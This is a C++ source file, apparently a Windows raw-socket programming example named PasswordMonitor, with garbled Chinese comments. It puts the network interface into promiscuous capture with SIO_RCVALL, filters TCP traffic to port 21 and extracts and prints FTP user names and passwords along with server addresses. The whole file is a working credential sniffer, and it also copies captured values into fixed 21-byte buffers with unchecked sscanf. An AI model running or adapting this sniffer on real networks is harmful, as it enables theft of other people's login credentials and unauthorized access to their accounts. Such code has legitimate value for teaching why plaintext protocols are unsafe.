/////////////////////////////////////////////////
// PasswordMonitor.cpp�ļ�

#include "../common/initsock.h"
#include "../common/protoinfo.h" 

#include <stdio.h>
#include <mstcpip.h>

#pragma comment(lib, "Advapi32.lib")

CInitSock theSock;



void GetFtp(char *pData, DWORD dwDestIp)
{
	char szBuf[256];
	static char szUserName[21];
	static char szPassword[21];

	if(strnicmp(pData, "USER ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szUserName);	
	}
	else if(strnicmp(pData, "PASS ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szPassword);

		wsprintf(szBuf, " Server Address: %s; User Name: %s; Password: %s; \n\n", 
								::inet_ntoa(*(in_addr*)&dwDestIp), szUserName, szPassword);

		printf(szBuf);	// ���������Խ������浽�ļ���
	}
}


void DecodeIPPacket(char *pData)
{
	IPHeader *pIPHdr = (IPHeader*)pData;


	int nHeaderLen = (pIPHdr->iphVerLen & 0xf) * sizeof(ULONG);

	switch(pIPHdr->ipProtocol)
	{
	case IPPROTO_TCP:
		{
			TCPHeader *pTCPHdr = (TCPHeader *)(pData + nHeaderLen);
			switch(::ntohs(pTCPHdr->destinationPort))
			{
			case 21:	// ftpЭ��
				{
					GetFtp((char*)pTCPHdr + sizeof(TCPHeader), pIPHdr->ipDestination);
				}
				break;

			case 80:	// httpЭ��...
			case 8080:
				
				break;
			}
		}
		break;
	case IPPROTO_UDP:
		break;
	case IPPROTO_ICMP:
		break; 
	}
}


void main()
{
	// ����ԭʼ�׽���
	SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);

	// ��ȡ����IP��ַ
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent *pHost;
	gethostname(szHostName, 56);
	if((pHost = gethostbyname((char*)szHostName)) == NULL)	
		return ;

	// �ڵ���ioctl֮ǰ���׽��ֱ����
	addr_in.sin_family  = AF_INET;
	addr_in.sin_port    = htons(0);
	memcpy(&addr_in.sin_addr.S_un.S_addr, pHost->h_addr_list[0], pHost->h_length);

	printf(" Binding to interface : %s \n", ::inet_ntoa(addr_in.sin_addr));
	if(bind(sRaw, (PSOCKADDR)&addr_in, sizeof(addr_in)) == SOCKET_ERROR)
		return;

	// ����SIO_RCVALL���ƴ��룬�Ա�������е�IP��	
	DWORD dwValue = 1;
	if(ioctlsocket(sRaw, SIO_RCVALL, &dwValue) != 0)	
		return ;
	
	// ��ʼ���շ��
	printf(" \n\n begin to monitor ftp password... \n\n");
	char buff[1024];
	int nRet;
	while(TRUE)
	{
		nRet = recv(sRaw, buff, 1024, 0);
		if(nRet > 0)
		{
			DecodeIPPacket(buff);
		}
	}
	closesocket(sRaw);
}

